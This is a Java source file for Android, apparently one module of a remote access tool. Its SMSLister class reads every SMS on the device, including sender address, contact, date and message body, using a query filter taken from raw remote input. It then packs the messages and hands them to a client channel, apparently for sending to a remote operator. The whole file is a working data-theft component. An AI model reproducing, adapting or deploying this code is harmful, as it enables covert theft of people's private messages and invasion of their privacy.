package my.app.Library;

import java.util.ArrayList;

import my.app.client.ClientListener;
import Packet.SMSPacket;
import Packet.SMSTreePacket;
import android.database.Cursor;
import android.net.Uri;

public class SMSLister {

	// ClientListener ctx;
	// int channel;

	public static boolean listSMS(ClientListener c, int channel, byte[] args) {
		final ArrayList<SMSPacket> l = new ArrayList<SMSPacket>();

		boolean ret = false;
		final String WHERE_CONDITION = new String(args);
		final String SORT_ORDER = "date DESC";
		final String[] column = { "_id", "thread_id", "address", "person", "date", "read", "body",
			"type" };
		final String CONTENT_URI = "content://sms/"; // content://sms/inbox,
														// content://sms/sent

		final Cursor cursor = c.getContentResolver().query(Uri.parse(CONTENT_URI), column,
			WHERE_CONDITION, null, SORT_ORDER);

		if (cursor.getCount() != 0) {
			cursor.moveToFirst();

			do
				if (cursor.getColumnCount() != 0) {
					final int id = cursor.getInt(cursor.getColumnIndex("_id"));
					final int thid = cursor.getInt(cursor.getColumnIndex("thread_id"));
					final String add = cursor.getString(cursor.getColumnIndex("address"));
					final int person = cursor.getInt(cursor.getColumnIndex("person"));
					final long date = cursor.getLong(cursor.getColumnIndex("date"));
					final int read = cursor.getInt(cursor.getColumnIndex("read"));
					final String body = cursor.getString(cursor.getColumnIndex("body"));
					final int type = cursor.getInt(cursor.getColumnIndex("type"));
					l.add(new SMSPacket(id, thid, add, person, date, read, body, type));
				}
			while (cursor.moveToNext());
			ret = true;
		} else
			ret = false;

		c.handleData(channel, new SMSTreePacket(l).build());
		return ret;
	}

}
